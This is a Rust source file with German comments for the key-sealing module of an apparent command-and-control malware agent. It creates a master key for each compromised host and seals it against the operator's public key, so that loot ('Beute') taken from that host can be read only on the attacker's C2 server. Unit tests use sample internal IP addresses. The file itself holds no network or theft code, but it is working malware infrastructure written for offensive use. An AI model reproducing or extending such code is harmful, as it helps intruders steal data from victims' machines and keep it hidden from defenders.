//! Kapselung des Host-Master-Keys gegen den oeffentlichen Server-Schluessel.
//!
//! Der Agent besitzt den privaten Server-Schluessel nicht. Er kapselt einen
//! Master-Key gegen den oeffentlichen Schluessel des Operators und meldet
//! beide Teile an den C2-Server: der Server kann den Master-Key wieder
//! gewinnen, ohne dass der Agent ihn jemals im Klartext uebertragen muss.
//!
//! Je Host ein eigener Master-Key — die Beute eines Hosts laesst sich nur mit
//! dem Schluessel dieses Hosts lesen.

use std::collections::HashMap;
use std::sync::Mutex;

use kx_core::hostkey::{DecodedServerKey, ServerPublicKey};

/// Material, mit dem der Agent Host-Master-Keys versiegelt.
pub struct KeySealer {
    server: DecodedServerKey,
    /// Die Master-Keys je Host — je Host einer, fuer die ganze Laufzeit.
    keys: Mutex<HashMap<String, SealedHostKey>>,
}

/// Das Ergebnis einer Kapselung: Master-Key und versiegeltes Material, beide
/// base64-kodiert — so, wie die Wire-Felder es verlangen.
#[derive(Clone)]
pub struct SealedHostKey {
    /// Das versiegelte Material (base64) — das geht an den C2-Server.
    pub sealed_master: String,
    /// Der Master-Key in Rohform — damit werden die Secrets verschluesselt.
    pub roh: [u8; 32],
}

impl KeySealer {
    /// Laedt den oeffentlichen Server-Schluessel aus einer JSON-Datei.
    ///
    /// Die Datei enthaelt die `ServerPublicKey`-Struktur aus
    /// `kx_core::hostkey` — erzeugt mit `cargo run -p kx-core --example
    /// gen_server_key`.
    pub fn load(pfad: &str) -> Result<Self, String> {
        let text = std::fs::read_to_string(pfad)
            .map_err(|e| format!("Server-Schluessel {pfad} nicht lesbar: {e}"))?;
        let public: ServerPublicKey =
            serde_json::from_str(&text).map_err(|e| format!("Server-Schluessel ungueltig: {e}"))?;
        let server = public
            .decode()
            .map_err(|e| format!("Server-Schluessel ungueltig: {e}"))?;
        Ok(KeySealer::from_server_key(server))
    }

    /// Ein Versiegler aus einem bereits entschlüsselten Server-Schlüssel.
    ///
    /// Der Normalfall ist [`KeySealer::load`] — die Schlüsseldatei. Diese
    /// Form ist fuer Aufrufer, die den Schlüssel schon im Speicher haben.
    pub fn from_server_key(server: DecodedServerKey) -> Self {
        KeySealer {
            server,
            keys: Mutex::new(HashMap::new()),
        }
    }

    /// Der Master-Key eines Hosts — je Host einer, fuer die ganze Laufzeit.
    ///
    /// Der Key entsteht beim ersten Aufruf und bleibt danach derselbe. Ohne
    /// dieses Memo entstuenden bei zwei Aufrufen fuer denselben Host zwei
    /// Keys: der zweite ueberschriebe beim Registrieren den `sealed_master`
    /// des ersten, und die bereits damit versiegelte Beute liesse sich mit dem
    /// neuen Key nicht mehr oeffnen.
    ///
    /// Ohne gueltigen Server-Schluessel gibt es kein Schluesselmaterial — der
    /// Aufrufer meldet die Beute dann ohne Verschluesselung, wie es ein
    /// aelterer Agent auch tut.
    pub fn schluessel_fuer(&self, host_id: &str) -> Option<SealedHostKey> {
        let mut keys = self.keys.lock().unwrap();
        if let Some(key) = keys.get(host_id) {
            return Some(key.clone());
        }
        let key = self.kapsel_neu()?;
        keys.insert(host_id.to_string(), key.clone());
        Some(key)
    }

    /// Kapselt einen neuen Master-Key fuer einen Host.
    fn kapsel_neu(&self) -> Option<SealedHostKey> {
        let kapselung = kx_core::hostkey::encapsulate_host_master_key_os(&self.server).ok()?;
        Some(SealedHostKey {
            sealed_master: kx_core::util::b64_encode(&kapselung.sealed_master),
            roh: kapselung.master_key,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Der Key muss zu einer Seriennummer passen — sonst ist die Beute eines
    /// Hosts nicht mehr zu lesen.
    fn sealer() -> KeySealer {
        let mut rng = rand_core::OsRng;
        let bundle = kx_core::hostkey::ServerKeyBundle::generate(
            kx_core::format::KexId::HybridX25519MlKem768,
            &mut rng,
        );
        let oeffentlich = bundle.public().expect("oeffentlicher Schluessel");
        let dekodiert = oeffentlich.decode().expect("dekodierter Schluessel");
        KeySealer::from_server_key(dekodiert)
    }

    #[test]
    fn derselbe_host_bekommt_denselben_schluessel() {
        let sealer = sealer();
        let erster = sealer.schluessel_fuer("192.168.1.5").expect("Schluessel");
        let zweiter = sealer.schluessel_fuer("192.168.1.5").expect("Schluessel");
        assert_eq!(erster.roh, zweiter.roh, "der Key wurde neu erzeugt");
        assert_eq!(erster.sealed_master, zweiter.sealed_master);
    }

    #[test]
    fn verschiedene_hosts_bekommen_verschiedene_schluessel() {
        let sealer = sealer();
        let a = sealer.schluessel_fuer("192.168.1.5").expect("Schluessel");
        let b = sealer.schluessel_fuer("192.168.1.6").expect("Schluessel");
        assert_ne!(a.roh, b.roh, "zwei Hosts teilen sich den Key");
    }
}
